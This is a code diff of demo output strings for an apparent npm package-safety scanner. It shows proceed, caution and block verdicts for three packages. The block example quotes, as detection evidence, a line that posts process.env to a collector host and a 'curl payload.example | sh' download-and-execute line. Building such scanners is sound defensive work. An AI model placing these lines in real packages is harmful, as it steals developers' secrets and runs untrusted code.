@@ -2,50 +2,48 @@ const demos = {
   proceed: `$ npx npx-vibe --check is-number
 ✓ npx-vibe: Proceed  risk 0/100
 is-number@7.0.0
-Returns true if a number or string value is a finite number.
 
-NPM updated: 2023-05-26  Version published: 2018-07-04
-License: MIT  Maintainers: 3  Publisher: jonschlinkert
-Repository: github.com/jonschlinkert/is-number
-GitHub: 284 stars  Last commit: 98e8ff1da1a8
-Downloads: 172,392,690/week
+Downloads: 172,392,690/week  Package age: 11y
 Install hooks: none
-AI review: skipped
+Established signals: long registry history, high weekly adoption, linked GitHub repository
+Registry popularity and age provide context, but never override code findings.
+AI review: skipped (No heuristic trigger required model review.)
 
 Action: package may be executed.`,
   caution: `$ npx npx-vibe --check esbuild
-! npx-vibe: Caution  risk 46/100
+! npx-vibe: Caution  risk 43/100
 esbuild@0.28.1
-An extremely fast JavaScript and CSS bundler and minifier.
 
-NPM updated: 2026-06-11  Version published: 2026-06-11
-License: MIT  Maintainers: 1  Publisher: GitHub Actions
-Repository: github.com/evanw/esbuild
-GitHub: 39,955 stars  Last commit: 6ff1d8b0d8c1
-Downloads: 244,263,932/week
+Downloads: 241,858,907/week  Package age: 3132d  Version age: 12d
 Install hooks: postinstall
-AI review: unavailable
+Established signals: long registry history, high weekly adoption, linked GitHub repository
+Registry popularity and age provide context, but never override code findings.
+AI review: skipped (Heuristic-only mode; AI was not requested.)
 
 Findings:
 - MEDIUM lifecycle_hook in package.json
+  postinstall runs: node install.js
+  Evidence: postinstall: node install.js
 - MEDIUM network_and_shell in install.js
+  Code combines network access with shell execution.
+  Evidence line 147: fetch(url) ... child_process.execSync(...)
 
 Action: review recommended before execution.`,
-  block: `$ npx npx-vibe sketchy-helper
-✕ npx-vibe: Block  risk 92/100
+  block: `$ npx npx-vibe --check sketchy-helper
+✕ npx-vibe: Block  risk 100/100
 sketchy-helper@0.0.3
-Fresh package with install-time credential access.
 
-NPM updated: today  Version published: today
-License: unknown  Maintainers: 1  Publisher: new-user
-Repository: unknown
-Downloads: 12/week
-Install hooks: preinstall, postinstall
-AI review: online model (high confidence)
+Downloads: 12/week  Package age: <1d
+Install hooks: postinstall
+AI review: skipped (Heuristic-only mode; AI was not requested.)
 
 Findings:
 - CRITICAL possible_secret_exfiltration in setup.js
+  Code accesses environment secrets and performs network activity.
+  Evidence line 8: fetch(collector, { body: JSON.stringify(process.env) })
 - CRITICAL download_and_execute in postinstall.js
+  External content is piped to a shell.
+  Evidence line 3: curl payload.example | sh
 
 Action: blocked unless --force is supplied.`
 };
